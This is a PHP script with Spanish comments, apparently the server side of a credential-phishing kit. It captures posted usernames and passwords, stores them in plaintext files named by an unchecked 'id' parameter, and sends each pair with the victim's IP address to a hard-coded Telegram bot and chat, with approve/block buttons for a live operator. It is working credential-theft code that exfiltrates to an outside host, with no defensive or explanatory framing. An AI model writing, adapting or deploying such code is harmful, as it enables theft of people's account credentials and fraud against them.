<?php

$id = $_POST['id'] ?? '';
$usuario = $_POST['usuario'] ?? '';
$clave = $_POST['clave'] ?? '';

// 🔥 SI VIENEN DATOS → GUARDARLOS EN SESIÓN
if($usuario && $clave){
    session_start();
    $_SESSION['usuario'] = $usuario;
    $_SESSION['clave'] = $clave;
}

// 🔥 SI NO VIENEN → RECUPERARLOS DE SESIÓN
if((!$usuario || !$clave)){
    session_start();
    $usuario = $_SESSION['usuario'] ?? '';
    $clave = $_SESSION['clave'] ?? '';
}
$dir = __DIR__ . "/sesiones/";
$file = $dir . $id . ".txt";

if((!$usuario || !$clave) && file_exists($file)){
    $contenido = file_get_contents($file);

    if(strpos($contenido, "|") !== false){
        list($usuario, $clave) = explode("|", $contenido);
    }
}

if(!$id){
    exit;
}

$dir = __DIR__ . "/sesiones/";

if(!is_dir($dir)){
    mkdir($dir, 0777, true);
}

$file = $dir . $id . ".txt";

/* ========================= */
/* PRIMERA VEZ: GUARDAR DATOS */
/* ========================= */

if($usuario && $clave){

  if(!file_exists($file) || trim(file_get_contents($file)) === ""){
        
        file_put_contents($file, "$usuario|$clave", LOCK_EX);

        $token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
        $chat_id = "8448767308";

        // 🌐 IP REAL
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

        if(strpos($ip, ',') !== false){
            $ip = explode(',', $ip)[0];
        }

        $ip = trim($ip);

        // 🌍 GEO (SIN ROMPER)
        $pais = "Pendiente";
        $ciudad = "Pendiente";

        // 🧾 MENSAJE
        $msg = "🔐 Nuevo acceso\n\n";
        $msg .= "👤 Usuario: $usuario\n";
        $msg .= "🔑 Clave: $clave\n\n";
        $msg .= "🌐 IP: $ip\n";
        $msg .= "📍 País: $pais\n";
        $msg .= "🏙 Ciudad: $ciudad\n";
        $msg .= "🆔 ID: $id";

        // 🔘 BOTONES
        $keyboard = [
            "inline_keyboard" => [
                [
                    ["text" => "✅ Aprobar", "callback_data" => "GO_$id"],
                    ["text" => "🚫 Bloquear", "callback_data" => "BLOCK_$id"]
                ]
            ]
        ];

        // 🚀 ENVÍO
        $ch = curl_init();

        curl_setopt_array($ch, [
            CURLOPT_URL => "https://api.telegram.org/bot$token/sendMessage",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => [
                "chat_id" => $chat_id,
                "text" => $msg,
                "reply_markup" => json_encode($keyboard)
            ],
            CURLOPT_RETURNTRANSFER => true
        ]);

        curl_exec($ch);
        curl_close($ch);
    }

    echo "OK";
    exit;
}

/* ========================= */
/* CONSULTAR ESTADO */
/* ========================= */

if(file_exists($file)){
    echo trim(file_get_contents($file));
} else {
    echo "WAIT";
}
